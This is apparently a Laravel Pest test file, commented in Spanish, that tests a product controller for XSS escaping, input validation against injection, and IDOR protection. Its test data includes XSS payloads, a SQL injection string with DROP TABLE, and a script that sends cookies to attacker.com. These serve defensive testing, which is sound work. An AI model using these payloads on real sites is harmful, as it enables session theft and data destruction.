<?php
use App\Models\Product;
use App\Models\Role;
use App\Models\User;
use App\Http\Controllers\ProductController;
use Illuminate\Support\Facades\Auth;
use Illuminate\Http\Request;
use Mockery;

beforeEach(function () {
       // Ejecutar los seeders necesarios
       $this->seed([
        EntitySeeder::class,
        PermissionSeeder::class,
        RoleSeeder::class,
        RoleEntityPermissionSeeder::class
    ]);

    // Obtener el rol Registrador que tiene permisos para gestionar productos
    $registradorRole = Role::where('slug', 'registrador')->first();

    // Crear usuario registrador para las pruebas con los campos correctos
    $this->registradorUser = User::factory()->create([
        'username' => 'registrador_test',
        'role_id' => $registradorRole->id
    ]);

    // Autenticar al usuario para todas las pruebas
    $this->actingAs($this->registradorUser);

    // Deshabilitar los middleware para las pruebas de integración
    $this->withoutMiddleware();

    // Crear algunos productos de prueba, incluyendo uno con contenido potencialmente malicioso
    $this->products = Product::factory()->count(2)->create([
        'user_id' => $this->registradorUser->id
    ]);
    
    // Crear un producto con datos maliciosos para pruebas de XSS
    $this->maliciousProduct = Product::create([
        'code' => 'XSS-TEST',
        'name' => '<script>alert("XSS")</script>',
        'description' => '<img src="x" onerror="alert(\'XSS\')">',
        'quantity' => 10,
        'price' => 99.99,
        'user_id' => $this->registradorUser->id
    ]);

    // Instanciar el controlador para pruebas unitarias
    $this->controller = new ProductController();
});

afterEach(function() {
    Mockery::close();
});

// Test de protección XSS en método index
test('index method escapes malicious content correctly', function () {
    // Llamar al método index directamente
    $response = $this->get(route('products.index'));
    
    // Verificar que la respuesta es exitosa
    $response->assertStatus(200);
    
    // Verificar que se usa la vista correcta
    $response->assertViewIs('products.index');
    
    // Verificar que los productos existen en la vista
    $response->assertViewHas('products');
    
    // Obtener el producto malicioso desde la base de datos nuevamente
    $maliciousProduct = Product::where('code', 'XSS-TEST')->first();
    
    // Verificar que el maliciousProduct existe en la base de datos
    $this->assertNotNull($maliciousProduct);
    
    // Llamar directamente al controlador para verificar el escape de datos
    $result = $this->controller->index();
    
    // Extraer los productos de la vista
    $viewProducts = $result->getData()['products'];
    
    // Buscar el producto malicioso
    $viewMaliciousProduct = $viewProducts->firstWhere('code', 'XSS-TEST');
    
    // Verificar que el producto malicioso existe en los resultados
    $this->assertNotNull($viewMaliciousProduct);
    
    // Verificar que el contenido malicioso ha sido escapado
    $this->assertStringNotContainsString('<script>', $viewMaliciousProduct->name);
    $this->assertStringNotContainsString('<img', $viewMaliciousProduct->description);
});

// Test de protección XSS en método edit
test('edit method escapes malicious content correctly', function () {
    // Llamar al método edit con el producto malicioso
    $result = $this->controller->edit($this->maliciousProduct);
    
    // Verificar que la vista es la correcta
    $this->assertEquals('products.edit', $result->getName());
    
    // Verificar que el producto existe en la vista
    $viewData = $result->getData();
    $this->assertTrue(isset($viewData['product']));
    
    // Verificar que el contenido malicioso ha sido escapado
    $product = $viewData['product'];
    
    // El nombre y descripción no deben contener etiquetas HTML intactas
    $this->assertStringNotContainsString('<script>', $product->name);
    $this->assertStringNotContainsString('<img', $product->description);
    
    // Verificar que se han usado funciones de escape
    $this->assertStringContainsString('&lt;script&gt;', $product->name);
    $this->assertStringContainsString('&lt;img', $product->description);
});

// Test de validación en store para rechazar código malicioso
test('store method rejects malicious code in code field', function () {
    // Datos con caracteres especiales en el código (potencialmente peligrosos)
    $maliciousData = [
        'code' => '<script>alert("XSS")</script>',
        'name' => 'Producto Test',
        'description' => 'Descripcion valida.',
        'quantity' => 5,
        'price' => 49.95,
    ];

    // Intentar crear un producto con código malicioso
    $response = $this->post(route('products.store'), $maliciousData);
    
    // Verificar que la validación falla para el campo code
    $response->assertSessionHasErrors(['code']);
    
    // Verificar que el producto no fue creado
    $this->assertDatabaseMissing('products', [
        'code' => '<script>alert("XSS")</script>'
    ]);
});

// Test de validación para campo name en store
test('store method rejects malicious characters in name field', function () {
    // Datos con caracteres especiales en el nombre (potencialmente peligrosos)
    $maliciousData = [
        'code' => 'VALID-CODE',
        'name' => '<iframe src="javascript:alert(`xss`)">',
        'description' => 'Descripción válida',
        'quantity' => 5,
        'price' => 49.95,
    ];

    // Intentar crear un producto con nombre malicioso
    $response = $this->post(route('products.store'), $maliciousData);
    
    // Verificar que la validación falla para el campo name
    $response->assertSessionHasErrors(['name']);
    
    // Verificar que el producto no fue creado
    $this->assertDatabaseMissing('products', [
        'code' => 'VALID-CODE'
    ]);
});

// Test de validación en store para rechazar descripción maliciosa
test('store method rejects malicious scripts in description field', function () {
    // Datos con script malicioso en la descripción
    $maliciousData = [
        'code' => 'VALID-CODE',
        'name' => 'Producto Test',
        'description' => '<script>document.location="http://attacker.com/steal.php?cookie="+document.cookie</script>',
        'quantity' => 5,
        'price' => 49.95,
    ];

    // Intentar crear un producto con descripción maliciosa
    $response = $this->post(route('products.store'), $maliciousData);
    
    // Verificar que la validación falla para el campo description
    $response->assertSessionHasErrors(['description']);
    
    // Verificar que el producto no fue creado
    $this->assertDatabaseMissing('products', [
        'code' => 'VALID-CODE'
    ]);
});

// Test de validación en update para rechazar inyección SQL en código
test('update method rejects sql injection in code field', function () {
    // Obtener un producto existente
    $product = $this->products->first();
    
    // Datos con intento de inyección SQL en el código
    $maliciousData = [
        'code' => "DROP-TABLE",
        'name' => $product->name,
        'description' => $product->description,
        'quantity' => $product->quantity,
        'price' => $product->price,
    ];

    // Modificar el código para incluir caracteres de inyección SQL
    $maliciousData['code'] = "DROP-TABLE'; DROP TABLE products; --";
    
    // Mock del request con validación personalizada
    $request = Mockery::mock(Request::class);
    $request->shouldReceive('validate')->andThrow(
        \Illuminate\Validation\ValidationException::withMessages([
            'code' => ['El formato del campo código es inválido.']
        ])
    );
    
    try {
        // Esto debería arrojar una excepción de validación
        $this->controller->update($request, $product);
        $this->fail('Se esperaba una excepción de validación');
    } catch (\Illuminate\Validation\ValidationException $e) {
        // Verificar que la excepción contiene errores para el campo code
        $this->assertTrue($e->validator->errors()->has('code'));
    }
    
    // Verificar que el producto no fue actualizado con el código malicioso
    $this->assertDatabaseMissing('products', [
        'id' => $product->id,
        'code' => "DROP-TABLE'; DROP TABLE products; --"
    ]);
});

// Test de validación en update para rechazar caracteres no permitidos en nombre
test('update method rejects special characters in name field', function () {
    // Obtener un producto existente
    $product = $this->products->first();
    
    // Datos con caracteres especiales no permitidos en el nombre
    $maliciousData = [
        'code' => $product->code,
        'name' => '<iframe src="javascript:alert(`xss`)">',
        'description' => $product->description,
        'quantity' => $product->quantity,
        'price' => $product->price,
    ];
    
    // Mock del request con validación personalizada
    $request = Mockery::mock(Request::class);
    $request->shouldReceive('validate')->andThrow(
        \Illuminate\Validation\ValidationException::withMessages([
            'name' => ['El formato del campo nombre es inválido.']
        ])
    );
    
    try {
        // Esto debería arrojar una excepción de validación
        $this->controller->update($request, $product);
        $this->fail('Se esperaba una excepción de validación');
    } catch (\Illuminate\Validation\ValidationException $e) {
        // Verificar que la excepción contiene errores para el campo name
        $this->assertTrue($e->validator->errors()->has('name'));
    }
    
    // Verificar que el producto no fue actualizado con el nombre malicioso
    $this->assertDatabaseMissing('products', [
        'id' => $product->id,
        'name' => '<iframe src="javascript:alert(`xss`)">'
    ]);
});

// Test para validar script malicioso en descripción update
test('update method rejects malicious scripts in description field', function () {
    // Obtener un producto existente
    $product = $this->products->first();
    
    // Datos con descripción maliciosa
    $maliciousData = [
        'code' => $product->code,
        'name' => $product->name,
        'description' => '<script>document.location="http://attacker.com/steal.php?cookie="+document.cookie</script>',
        'quantity' => $product->quantity,
        'price' => $product->price,
    ];
    
    // Mock del request con validación personalizada
    $request = Mockery::mock(Request::class);
    $request->shouldReceive('validate')->andThrow(
        \Illuminate\Validation\ValidationException::withMessages([
            'description' => ['El formato del campo descripción es inválido.']
        ])
    );
    
    try {
        // Esto debería arrojar una excepción de validación
        $this->controller->update($request, $product);
        $this->fail('Se esperaba una excepción de validación');
    } catch (\Illuminate\Validation\ValidationException $e) {
        // Verificar que la excepción contiene errores para el campo description
        $this->assertTrue($e->validator->errors()->has('description'));
    }
    
    // Verificar que el producto no fue actualizado con la descripción maliciosa
    $this->assertDatabaseMissing('products', [
        'id' => $product->id,
        'description' => '<script>document.location="http://attacker.com/steal.php?cookie="+document.cookie</script>'
    ]);
});

// Test para verificar que el método destroy no es vulnerable a referencias de objeto directo inseguras
test('destroy method validates product ownership to prevent IDOR', function () {
    // Crear un usuario diferente
    $otroRole = Role::where('slug', '!=', 'registrador')->first() ?: Role::factory()->create();
    $otroUsuario = User::factory()->create([
        'role_id' => $otroRole->id
    ]);
    
    // Crear un producto que pertenece a otro usuario
    $productoAjeno = Product::factory()->create([
        'user_id' => $otroUsuario->id
    ]);
    
    // Intentar borrar un producto que no pertenece al usuario autenticado
    // Esto simularía un intento de IDOR (Insecure Direct Object Reference)
    $response = $this->delete(route('products.destroy', $productoAjeno));
    
    // En un controlador seguro, esto debería fallar o redirigir sin eliminar
    // Verificar que el producto aún existe
    $this->assertDatabaseHas('products', [
        'id' => $productoAjeno->id
    ]);
});